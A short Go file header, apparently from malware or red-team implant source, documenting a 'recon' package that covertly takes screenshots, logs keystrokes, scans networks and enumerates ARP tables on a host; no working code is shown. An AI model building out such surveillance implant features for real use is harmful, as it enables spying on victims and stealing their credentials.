// Package recon provides host reconnaissance techniques for the agent implant.
//
// Techniques:
//   - GDI screenshot (BitBlt + GetDIBits)
//   - Keylogger (GetAsyncKeyState polling)
//   - Network scanner (TCP connect scan)
//   - ARP table enumeration
//
// Windows GDI calls use winsyscall proc vars; network ops use stdlib net.
package recon
